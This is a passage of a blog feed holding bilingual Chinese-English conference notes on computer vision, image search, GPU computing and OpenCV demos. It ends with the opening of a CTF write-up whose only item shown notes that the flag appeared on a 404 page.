&lt;li&gt;要變成人類歷史的一部份，轉化成可搜尋的話，是個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;A Brief History of Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1966, Marvin Minsky  &lt;ul&gt;
&lt;li&gt;50 年過後，我們還沒完全解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1960's: Interpretation of Synthetic Worlds  &lt;ul&gt;
&lt;li&gt;Larry Roberts (Father of Computer Vision)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1970's: Some progress on interpreting selected images  &lt;/li&gt;
&lt;li&gt;1980's: AI Winter ... back to basics  &lt;ul&gt;
&lt;li&gt;1984: Perceptual Organization and Visual Recognition, David Lowe  &lt;/li&gt;
&lt;li&gt;Blending  &lt;/li&gt;
&lt;li&gt;Shape from shading  &lt;ul&gt;
&lt;li&gt;用三角函數找出反光的角度建模  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Detection  &lt;/li&gt;
&lt;li&gt;From Science to Engineering  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1990's: structure, segmentation and face recognition  &lt;/li&gt;
&lt;li&gt;2000's: more object classes, computational photography, video processing  &lt;ul&gt;
&lt;li&gt;重新對焦的照相機  &lt;/li&gt;
&lt;li&gt;Texture Sythesis  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010's: Deep Learning is Back!!  &lt;ul&gt;
&lt;li&gt;AlexNet NIPS 2012  &lt;/li&gt;
&lt;li&gt;DeepFace CVPR 2014  &lt;/li&gt;
&lt;li&gt;DeepPose CVPR 2014  &lt;/li&gt;
&lt;li&gt;Show, Attend and Tell ICML 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Basic parts of Computer Vision&lt;/h2&gt;
&lt;h3&gt;Reference Books&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Multiple View Geometry in Computer Vision", Richard Hartley and Andrew Zisserman  &lt;ul&gt;
&lt;li&gt;A good book to get started on camera geometry  &lt;/li&gt;
&lt;li&gt;More math heavry but very old school  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://szeliski.org/Book/"&gt;"Computer Vision: Algorithms and Applications", Richard Szeliski&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;More balanced mix between math and application  &lt;/li&gt;
&lt;li&gt;Freely available online.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Image Formation and 2D Image Processing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Image formation  &lt;ul&gt;
&lt;li&gt;照相原理：散射會造成無法成像，所以透過針孔（作為 barrier），使其成像。  &lt;ul&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;光線不足，所以很暗  &lt;/li&gt;
&lt;li&gt;針孔太大的話，成像會變模糊，所以加上透鏡輔助。  &lt;ul&gt;
&lt;li&gt;Circle of Confusion  &lt;ul&gt;
&lt;li&gt;有散景表示你的鏡頭光圈夠大，代表你是有錢人。 XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Modeling Projection  &lt;ul&gt;
&lt;li&gt;The coordinate system  &lt;ul&gt;
&lt;li&gt;Homogeneous Coordinations  &lt;ul&gt;
&lt;li&gt;3D 轉 2D  &lt;/li&gt;
&lt;li&gt;4D 轉 3D  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Projection equations  &lt;/li&gt;
&lt;li&gt;Camera parameters  &lt;ul&gt;
&lt;li&gt;外部參數(extrinsics)  &lt;/li&gt;
&lt;li&gt;內部參數(intrinsics)  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ai.stanford.edu/~saumitro/projektiv/"&gt;http://ai.stanford.edu/~saumitro/projektiv/&lt;/a&gt; 可以透過這個網址來瞭解外部參數和內部參數實際上的影響  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distortion （扭曲）  &lt;ul&gt;
&lt;li&gt;Types  &lt;ul&gt;
&lt;li&gt;Pin Cushion Distortion（針包）  &lt;/li&gt;
&lt;li&gt;Barrel Distortion （木桶）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Camera Calibration （攝影機校正）  &lt;ul&gt;
&lt;li&gt;使用時機：把扭曲移除、改變照片的角度、要辨認轉了角度的物件畫面 (Low Level Projection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tilt-shift  &lt;ul&gt;
&lt;li&gt;Digital Color Images  &lt;ul&gt;
&lt;li&gt;Bayer Filter  &lt;ul&gt;
&lt;li&gt;人對綠色比較敏感，對藍色比較不敏感。  &lt;/li&gt;
&lt;li&gt;彩色的照片是 3 個黑白的 RGB 疊加起來  &lt;/li&gt;
&lt;li&gt;Many early algorithms use greyscale instead of color images, Why?  &lt;ul&gt;
&lt;li&gt;早期只有灰階照片  &lt;/li&gt;
&lt;li&gt;彩色會有偏差  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Filtering  &lt;ul&gt;
&lt;li&gt;Sliding Window  &lt;/li&gt;
&lt;li&gt;Sharpening filter (Unsharp Mask)  &lt;/li&gt;
&lt;li&gt;Vertical Edge  &lt;/li&gt;
&lt;li&gt;Horizontal Edge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Epipolar geomerty and stereo matching&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Recovering structure from a single view  &lt;ul&gt;
&lt;li&gt;Intrinsic ambiguity of the mapping from 3D to image (2D)  &lt;/li&gt;
&lt;li&gt;2D 是無法直接確定物體距離與深度的，必須用兩個眼睛來看，三角定位。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Epipolar_geometry"&gt;Epipolar geomerty&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Parallel Images Plane  &lt;/li&gt;
&lt;li&gt;Forward translation  &lt;/li&gt;
&lt;li&gt;Epipolar line  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=sKJeTaIEldM"&gt;The "Vertigo" Effect&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Epipolar Constraint (F)  &lt;ul&gt;
&lt;li&gt;Estimating F  &lt;ul&gt;
&lt;li&gt;The Eight-Point Algorithm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fundamental Matrix 很重要！  &lt;/li&gt;
&lt;li&gt;Rectification  &lt;ul&gt;
&lt;li&gt;Your basic stereo algorithm  &lt;/li&gt;
&lt;li&gt;Triangulation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth Map Results  &lt;/li&gt;
&lt;li&gt;Active stereo with structured light  &lt;ul&gt;
&lt;li&gt;Data Acquisition  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Structure from motion and tracking&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Finding Path Through the World's Photos  &lt;/li&gt;
&lt;li&gt;Pose Estimation  &lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;ul&gt;
&lt;li&gt;Tracking  &lt;ul&gt;
&lt;li&gt;找特徵點去追蹤，然後解出結構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Stitching and computational photography&lt;/h3&gt;
&lt;p&gt;如何把一堆照片合起來變成一張大照片  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Image Mosaics  &lt;/li&gt;
&lt;li&gt;Recognizing Panormas  &lt;/li&gt;
&lt;li&gt;De-Ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based de-ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based compositing  &lt;/li&gt;
&lt;li&gt;Photomontage  &lt;/li&gt;
&lt;li&gt;可以把好幾張裏面有不同人閉眼的照片合成一張沒有人閉眼的照片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Poisson Image Editing  &lt;ul&gt;
&lt;li&gt;Possion Equation: 微分、微分、再積分  &lt;/li&gt;
&lt;li&gt;照片合成特效  &lt;/li&gt;
&lt;li&gt;Seamless Poisson cloning  &lt;/li&gt;
&lt;li&gt;Face Cloning  &lt;/li&gt;
&lt;li&gt;Texture Swapping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Mobile Panorama  &lt;/li&gt;
&lt;li&gt;High Dynamic Range Imaging (HDR)  &lt;ul&gt;
&lt;li&gt;The real word is high dynamic range  &lt;ul&gt;
&lt;li&gt;Typical cameras have limited dynamic range  &lt;ul&gt;
&lt;li&gt;Solution: Merge multiple exposures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Varying Exposure  &lt;/li&gt;
&lt;li&gt;Tone Mapping  &lt;/li&gt;
&lt;li&gt;Simple Global Operator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Local Adjustment of Tonal Values  &lt;ul&gt;
&lt;li&gt;Tonal （色調） Manipulation  &lt;/li&gt;
&lt;li&gt;Constraint Propagation  &lt;/li&gt;
&lt;li&gt;Touch-Tone: Point-and-Swipe Image Editing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Visual Recognition and Query&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1989  &lt;ul&gt;
&lt;li&gt;MNIST, Backpropagation applied to handwritten zip code recognition  &lt;/li&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1998, Neural Network-Based Face Detection  &lt;/li&gt;
&lt;li&gt;1999, SIFT (Scale Invariant Feature Transform)  &lt;ul&gt;
&lt;li&gt;Object Recognition from Local Scale-Invariant Features, Lowe, ICCV 1999.  &lt;/li&gt;
&lt;li&gt;No more sliding windows (interest points)  &lt;/li&gt;
&lt;li&gt;Better features (use more computation)  &lt;/li&gt;
&lt;li&gt;找出來的特徵點會是一個球，而不是邊邊角角。  &lt;/li&gt;
&lt;li&gt;Better Descriptor  &lt;ul&gt;
&lt;li&gt;Image gradients =&amp;gt; Keypoint descriptor  &lt;/li&gt;
&lt;li&gt;Truncated normalization (globally)  &lt;/li&gt;
&lt;li&gt;高維度的球  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What worked  &lt;ul&gt;
&lt;li&gt;Object instance recognition  &lt;/li&gt;
&lt;li&gt;Panaroma  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認東西  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2001, Rapid Object Detection using a Boosted Cascade of Simple Features, Viola and Jones  &lt;ul&gt;
&lt;li&gt;Why did it work?  &lt;ul&gt;
&lt;li&gt;Simple Features (Haar wavelets)  &lt;/li&gt;
&lt;li&gt;假設光線都是從上打下來，直接去認眼睛和鼻子的陰影，覺得有可能的保留，沒可能的就丟掉，所以速度很快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why did it fail?  &lt;ul&gt;
&lt;li&gt;側面就無法 work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2003, Constellatioin model (redux) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Object Class Recognition by Unsupervised Scale-Invariant Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2005, HOG (Histograms of oriented gradients) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Normalize locally not globally  &lt;/li&gt;
&lt;li&gt;Why worked?  &lt;ul&gt;
&lt;li&gt;Hard negative mining  &lt;/li&gt;
&lt;li&gt;Computers are fast enought  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認出運動中的人，必須要站著。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2007, Pascal VOC  &lt;ul&gt;
&lt;li&gt;The PASCAL Visual Object Classes (VOC) Challenge  &lt;/li&gt;
&lt;li&gt;只有 20 個分類  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2008, DPM (Deformable parts model)  &lt;ul&gt;
&lt;li&gt;Object Detection with Discriminatively Trained Part Based Model  &lt;/li&gt;
&lt;li&gt;Star-structure  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2009, Caltech Pedestrian  &lt;/li&gt;
&lt;li&gt;2009, ImageNet  &lt;ul&gt;
&lt;li&gt;ImageNet, A Large-Scale Hierarchical Image Database  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010, SUN  &lt;ul&gt;
&lt;li&gt;SUN Database: Large-scale Scene Recognition from Abbey to Zoo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mscoco.org"&gt;MS COCO&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;over 77,000 worker hours (8+ years)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2012 DNNs  &lt;ul&gt;
&lt;li&gt;GPUs + Data  &lt;/li&gt;
&lt;li&gt;Classification vs Deteciton  &lt;ul&gt;
&lt;li&gt;Detection need to know the position of the target object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CNN, RNN  &lt;/li&gt;
&lt;li&gt;Why it fails  &lt;ul&gt;
&lt;li&gt;找不到位置的話就很難去判斷  &lt;/li&gt;
&lt;li&gt;Neural Networks are easily fooled  &lt;ul&gt;
&lt;li&gt;會把看起來完全不相關的雜訊誤判成某些物件  &lt;ul&gt;
&lt;li&gt;Neural Networks are easily fooled: High Confidence Predictions for Unrecognizable Images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PANDA: Pose Aligned Networks for Deep Attribute Modeling  &lt;/li&gt;
&lt;li&gt;DeepFace: closing the gap to  human-Level performance in fac verification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Additional Challenges  &lt;ul&gt;
&lt;li&gt;Detecgtion in context (with common sense)  &lt;ul&gt;
&lt;li&gt;加入一些常識的判斷，例如：人在普通情況下不可能在天上飛之類的等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model awareness  &lt;/li&gt;
&lt;li&gt;Training time (when dataset is incrementally updated)  &lt;ul&gt;
&lt;li&gt;每個公司都用大量的電腦去運算，不僅耗時，也蠻浪費電的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More science?  &lt;ul&gt;
&lt;li&gt;目前比較像是大量嘗試去找出方法，不太有系統且有科學性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【索引】多媒體檢索&lt;/h1&gt;
&lt;h2&gt;Search By Image Examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Still very much an open problem  &lt;/li&gt;
&lt;li&gt;Most commercial applications use a mixture of algorithms  &lt;ul&gt;
&lt;li&gt;沒有一種演算法可以完全解決這個問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Goggles in action  &lt;ul&gt;
&lt;li&gt;Text =&amp;gt; OCR  &lt;/li&gt;
&lt;li&gt;Landmarks, Books, Artwork, Wine, Logos =&amp;gt; SIFT  &lt;/li&gt;
&lt;li&gt;Contact Info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TinEye  &lt;ul&gt;
&lt;li&gt;以圖找圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instance Recognition  &lt;/li&gt;
&lt;li&gt;Search Structure  &lt;/li&gt;
&lt;li&gt;Possible Solutions  &lt;ul&gt;
&lt;li&gt;Find approximate words  &lt;ul&gt;
&lt;li&gt;Approximate nearest neighbour (ANN)  &lt;/li&gt;
&lt;li&gt;維度比較高，所以速度比較慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Find lower dimensional spae to split the data  &lt;ul&gt;
&lt;li&gt;找 2D 的的資料，雖然沒那麼準確，但速度會比較快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scalable Recognition with a Vocabulary Tree  &lt;ul&gt;
&lt;li&gt;先拿一張圖找 Feature  &lt;/li&gt;
&lt;li&gt;找出來後丟到高維度的空間（約兩百多維)  &lt;/li&gt;
&lt;li&gt;會有很多不同的點  &lt;/li&gt;
&lt;li&gt;用定義好的向量距離，用 &lt;a href="https://en.wikipedia.org/wiki/K-means_clustering"&gt;K-means&lt;/a&gt; 做分群  &lt;/li&gt;
&lt;li&gt;遞迴做下去就可以得到愈多種類的分群結果  &lt;/li&gt;
&lt;li&gt;最後再把不需要的東西去掉，得到 Vocabulary Tree  &lt;/li&gt;
&lt;li&gt;得到 Vocabulary Tree 後，把每個 Feature 丟進去，會知道在 Vocabulary Tree 的哪個節點  &lt;/li&gt;
&lt;li&gt;如果該 Feature 的結果只指向一張圖的話，就很有可能是這張圖。  &lt;/li&gt;
&lt;li&gt;但當某個節點有關的圖愈多的話，entropy 愈高，結果就愈難判斷。  &lt;/li&gt;
&lt;li&gt;這時候可以使用 &lt;a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"&gt;tf-idf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【加速】圖形處理器與深度學習 (GPU and Computation)&lt;/h1&gt;
&lt;h2&gt;Parallel Processing and GPU&lt;/h2&gt;
&lt;h3&gt;Parallel Computing Goals&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;To slove your problem in less time  &lt;ul&gt;
&lt;li&gt;平行化去處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In order to parallelize a problem  &lt;ul&gt;
&lt;li&gt;要去看哪邊有關聯性，並確定處理這些關聯性對演算法的影響。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Types of Parallelism&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Multiple Programs  &lt;ul&gt;
&lt;li&gt;Multi-tasking  &lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Single Program  &lt;ul&gt;
&lt;li&gt;Instruction-levl parallelism  &lt;ul&gt;
&lt;li&gt;Multiple instructions in a serial program get excuted simultaneously  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data-level parallelism  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;S&lt;/strong&gt;ingle &lt;strong&gt;I&lt;/strong&gt;nstruction, &lt;strong&gt;M&lt;/strong&gt;ultiple &lt;strong&gt;D&lt;/strong&gt;ata processing model (SIMD)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Amdahl's Law  &lt;ul&gt;
&lt;li&gt;Named after computer architect Gene Amdahl  &lt;/li&gt;
&lt;li&gt;Speedup of a parallel computer is limited by the amount of serial work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resource Management  &lt;ul&gt;
&lt;li&gt;哲學家晚餐問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPU Applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Real-time rendering. e.g. Game  &lt;/li&gt;
&lt;li&gt;Movie Effect  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPUs Today&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GPUs are becoming more programmable  &lt;/li&gt;
&lt;li&gt;GPUs now support 32/64 bit floating points numbers  &lt;/li&gt;
&lt;li&gt;GPUs have higher memory bandwidth than CPUs  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;NVIDIA CUDA&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Compute Unified Device Architecture  &lt;/li&gt;
&lt;li&gt;CUDA Workflow  &lt;ul&gt;
&lt;li&gt;Get a CUDA-enabled GPU  &lt;/li&gt;
&lt;li&gt;Write C/C++ like code (*.cu)  &lt;/li&gt;
&lt;li&gt;Compile with CUDA compiler (nvcc)  &lt;ul&gt;
&lt;li&gt;Generated PTX code ("Parallel Thread Execution")  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Applications auto-magically run on GPUs  &lt;ul&gt;
&lt;li&gt;Many many parallel threads  &lt;/li&gt;
&lt;li&gt;CUDA driver translate PTX code into hardware.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CUDA Overview  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;之前學 CUDA 時收集的一份不錯的 CUDA 教學系列文：&lt;a href="/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Frameworks and Libraries&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;MATLAB  &lt;/li&gt;
&lt;li&gt;BLAS Library (Basic Linear Algebra Subprograms)  &lt;ul&gt;
&lt;li&gt;和 Fortran 同年代的產物  &lt;/li&gt;
&lt;li&gt;Processor vendors implement their BLAS library  &lt;ul&gt;
&lt;li&gt;e.g., Intel MKL (Math Kernel Library)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;cuBLAS - CUDA version, very fast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA Thrust Library  &lt;ul&gt;
&lt;li&gt;A little like C++ STL library for CUDA  &lt;/li&gt;
&lt;li&gt;Very few lines of code for vector manipulation  &lt;/li&gt;
&lt;li&gt;Fast implementation of parallel primitives  &lt;ul&gt;
&lt;li&gt;reduce  &lt;ul&gt;
&lt;li&gt;mapreduce  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scan  &lt;/li&gt;
&lt;li&gt;sort  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA cuDNN  &lt;ul&gt;
&lt;li&gt;Deep Neural Network Library for CUDA  &lt;/li&gt;
&lt;li&gt;TensorFlow, Caffe, Microsoft CNTK  &lt;/li&gt;
&lt;li&gt;Deep Learning Getting Started Advises  &lt;ul&gt;
&lt;li&gt;Borrow (steal if you must) a modern GPU  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="http://caffe.berkeleyvision.org"&gt;Caffe&lt;/a&gt; for your deep learning projects  &lt;/li&gt;
&lt;li&gt;Browse through the Caffe Model Zoo and try out the existing (pre-trained) models (AlexNet, R-CNN and GooLeNet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;電腦視覺之實作演示&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Introduct OpenCV by the official tutorials  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Core functionality  &lt;/li&gt;
&lt;li&gt;Image processing  &lt;/li&gt;
&lt;li&gt;Demos  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python, OpenCV, Numpy  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Canny Edge Detection  &lt;ol&gt;
&lt;li&gt;Detect unique edges  &lt;ul&gt;
&lt;li&gt;不管是 strong edge 或 weak edge 在經過微分後都會產生一個 peak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Voting (Use 2 threshold)  &lt;ul&gt;
&lt;li&gt;Strong edge: Always accept.  &lt;/li&gt;
&lt;li&gt;Weak edge: Accept when connected.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是很多後續演算法的基礎  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Histogram  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;OpenCV QR Drive  &lt;ul&gt;
&lt;li&gt;QR code Marker Detection  &lt;ul&gt;
&lt;li&gt;1:1:3:1:1 black-white markers at the coners  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to detect 11311?  &lt;ul&gt;
&lt;li&gt;Only need to use raster scan  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="https://en.wikipedia.org/wiki/Otsu%27s_method"&gt;Otsu algorithm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Thresholding: leave only white and black  &lt;/li&gt;
&lt;li&gt;A binarization algorithm that minimize the weighted intra-class variance algorighm for bimodal distributioin.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Detect the most bright points  &lt;ol&gt;
&lt;li&gt;Dilate  &lt;/li&gt;
&lt;li&gt;Equality check  &lt;/li&gt;
&lt;li&gt;Threshold  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Dilation and thresholding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make a little PiBorg which will chase the $1,000 NTD bill.  &lt;ul&gt;
&lt;li&gt;The PiBorg (RPi + Motor) aka &lt;a href="https://www.youtube.com/watch?v=s3Qdsn401H0"&gt;DoodleBorg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift (WACV 98)  &lt;/li&gt;
&lt;li&gt;Meanshift  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.opencv.org/3.1.0/db/df8/tutorial_py_meanshift.html"&gt;OpenCV: Meanshift and Camshift&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift 比 Meanshift 多了一個 scale 的選項  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;Basic OpenCV functionalities  &lt;/li&gt;
&lt;li&gt;OpenCV and image processing  &lt;/li&gt;
&lt;li&gt;OpenCV and detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Data Science"></category><category term="Deep Learning"></category><category term="Conf"></category></entry><entry><title>HITCON CTF 2015 Quals Write-up</title><link href="https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" rel="alternate"></link><published>2015-10-19T11:42:55+08:00</published><updated>2015-10-19T11:42:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-19:posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</id><summary type="html">&lt;h2&gt;MISC - Flag not Found [1]&lt;/h2&gt;
&lt;p&gt;Any &lt;code&gt;404 Nout Found&lt;/code&gt; page on &lt;a href="https://ctf2015.hitcon.org"&gt;https://ctf2015.hitcon.org&lt;/a&gt; will print out the flag.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png" /&gt;  &lt;/p&gt;
